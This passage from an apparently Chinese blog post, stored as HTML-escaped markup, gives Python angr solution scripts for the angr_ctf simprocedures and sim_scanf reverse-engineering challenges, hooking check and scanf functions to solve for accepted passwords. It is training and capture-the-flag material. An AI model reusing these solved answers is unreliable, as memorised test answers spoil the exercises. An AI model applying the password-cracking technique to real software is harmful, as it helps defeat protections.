			cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;If(cipher &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; target, claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;), claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))

	check_equal_symbol &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check_equals_XYMKBKUHNIQYNQXE&amp;#39;&lt;/span&gt;
	proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_symbol(check_equal_symbol, replace_check_equal())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_success&lt;/span&gt;(state):
	output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;should_avoid&lt;/span&gt;(state):
	output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try again.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_success, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; should_avoid)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
	print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
	print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no solution&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;simprocedures&#34;&gt;simprocedures&lt;/h2&gt;
&lt;p&gt;同样先用之前的方法写了一遍&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./10_angr_simprocedures&amp;#39;&lt;/span&gt;)

start_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486C3&lt;/span&gt;
init_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start_addr)

init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ebp &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD&lt;/span&gt;

user_input1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
user_input3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input3&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
user_input4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input4&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input4)
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input3)
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input2)
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input1)

init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ebp &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(init_state)

check_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80499F1&lt;/span&gt;
simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; check_addr)

ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ORSDDWXHZURJRBDH&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    solution_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    input_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ebp &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;
    result1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
    result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
    result3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
    result4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
    solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(ans[:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; result1)
    solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(ans[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; result2)
    solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(ans[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; result3)
    solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(ans[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; result4)
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input1, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input2, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input3, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input4, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后用 &lt;code&gt;hook_symbol&lt;/code&gt; 试试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./10_angr_simprocedures&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_check_equals&lt;/span&gt;(SimProcedure):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self, to_check, length):
        target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ORSDDWXHZURJRBDH&amp;#39;&lt;/span&gt;
        result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(to_check, length)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;If(result &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; target, claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;), claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))

check_equals_sym &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check_equals_ORSDDWXHZURJRBDH&amp;#39;&lt;/span&gt;
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_symbol(check_equals_sym, replace_check_equals())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_successful&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;should_abort&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try again.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_successful, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; should_abort)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sim_scanf&#34;&gt;sim_scanf&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;simProcedure&lt;/code&gt; 其实是 &lt;code&gt;angr&lt;/code&gt; 用于缓解路径爆炸的一个策略，将一些有可能导致路径爆炸的库函数进行了重写，然而 &lt;code&gt;angr&lt;/code&gt; 提供的重写可能存在不完善的地方，例如 &lt;code&gt;scanf&lt;/code&gt; 无法支持多个参数，因此这道题目中，需要自己重写 &lt;code&gt;scanf&lt;/code&gt; 的 &lt;code&gt;SimProcedure&lt;/code&gt;，实现接收两个参数&lt;/p&gt;
&lt;p&gt;这道题主要学到的就是利用 &lt;code&gt;globals&lt;/code&gt; 存储注入的符号&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./11_angr_sim_scanf&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

start_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;inputs&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_scanf&lt;/span&gt;(SimProcedure):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self, fmt, input1, input2):
        user_input1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
        user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(input1, user_input1, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(input2, user_input2, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;inputs&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((user_input1, user_input2))

scanf_sym &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__isoc99_scanf&amp;#34;&lt;/span&gt;
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_symbol(scanf_sym, replace_scanf())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_success&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;should_avoid&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try again.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_success, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; should_avoid)

